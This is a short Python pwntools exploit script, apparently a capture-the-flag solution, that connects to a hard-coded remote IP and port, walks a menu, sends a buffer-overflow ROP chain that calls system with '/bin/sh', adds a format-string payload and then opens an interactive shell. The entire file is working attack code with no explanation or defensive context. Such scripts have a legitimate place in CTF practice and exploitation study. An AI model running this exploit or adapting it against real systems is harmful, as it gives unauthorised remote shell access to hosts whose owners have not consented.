#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
host = "58.213.63.30"
port = 50021
#host = "10.211.55.23"
#port = 8888

r = remote(host,port)


r.recvuntil(":")
r.sendline("ddaa")

r.recvuntil("Exit")
r.sendline("2")

r.recvuntil("2.Protego")
r.sendline("2")
r.recvuntil("2.Protego")
r.sendline("2")
r.recvuntil("2.Protego")
r.sendline("2")

time.sleep(3)
rop = "a"*0x34
rop += p32(0x804b778+4)
rop += p32(0x80489f0) #system
rop += p32(0xddaaddaa)
rop += p32(0x804b784)
rop += "/bin/sh\x00"
r.sendline(rop)
payload = fmtchar(0,0x804b780,4,4)
time.sleep(5)

r.sendline(payload)
r.interactive()
